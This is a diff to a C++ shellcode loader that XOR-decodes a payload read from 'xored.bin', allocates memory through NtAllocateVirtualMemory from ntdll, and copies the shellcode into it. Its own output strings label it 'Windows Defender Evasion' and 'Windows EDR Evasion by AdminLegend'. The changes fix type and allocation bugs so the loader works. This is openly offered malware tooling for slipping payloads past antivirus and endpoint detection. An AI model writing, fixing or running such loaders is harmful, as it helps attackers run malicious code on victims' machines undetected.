@@ -6,7 +6,7 @@
 #pragma comment(lib, "ntdll.lib")
 
 #define XOR_KEY 0x42
-#define THREAD_ALL_ACCESS 0x1FFFFF
+#define XORED_FILE "xored.bin"
 
 typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
 HANDLE ProcessHandle,
@@ -40,17 +40,23 @@ buffer[i] ^= key;
 char* LoadShellcode(const char* filename, SIZE_T* size) {
 std::ifstream file(filename, std::ios::binary | std::ios::ate);
 if (!file) return nullptr;
-size = file.tellg();
-char buffer = new char[*size];
+
+// Fix: Use std::streamsize to avoid type mismatch
+std::streamsize fileSize = file.tellg();
+*size = static_cast<SIZE_T>(fileSize);
+
+// Fix: Correctly allocate and return a char* buffer
+char* buffer = new char[*size];
 file.seekg(0, std::ios::beg);
-file.read(buffer, *size);
+file.read(buffer, fileSize);
 file.close();
 return buffer;
+
 }
 
 int main() {
 SIZE_T shellcodeSize = 0;
-char* shellcode = LoadShellcode("output.bin", &shellcodeSize);
+char* shellcode = LoadShellcode(XORED_FILE, &shellcodeSize);
 if (!shellcode) {
 std::cerr << "[-] Failed to load shellcode\n";
 return -1;
@@ -90,7 +96,7 @@ if (status != 0) {
 }
 
 std::cout << "[+] Memory allocated at: " << baseAddr << "\n";
-std::cout << "[+] Windows Defender Evasion by AdminLegend\n";
+std::cout << "[+] Windows EDR Evasion by AdminLegend\n";
 memcpy(baseAddr, shellcode, shellcodeSize);
 delete[] shellcode;
 
